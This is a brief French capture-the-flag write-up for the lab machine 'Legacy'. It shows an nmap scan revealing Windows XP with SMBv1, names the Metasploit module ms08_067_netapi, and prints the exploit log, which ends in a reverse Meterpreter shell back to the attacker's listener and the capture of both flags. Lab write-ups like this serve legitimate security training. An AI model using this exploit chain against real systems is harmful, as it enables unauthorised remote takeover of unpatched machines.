# Legacy - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-06 16:07 EST
Nmap scan report for 10.10.10.4
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 4d18h57m57s, deviation: 1h24m50s, median: 4d17h57m57s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:7f:8f (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-02-11T19:05:22+02:00
```

On remarque directement que la version de windows est très vieille (2000) avec SMB v1, on va donce essayer de trouver des exploits anciens pour SMB.

On trouve la vulnérabilité ms08_067_netapi sur metasploit. Elle fonctionne directement

```bash
[*] Started reverse TCP handler on 10.10.16.6:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.6:4444 -> 10.10.10.4:1032) at 2023-02-06 16:42:12 -0500

(Meterpreter 1)(C:\WINDOWS\system32) >
```

On obtient le flag user et root.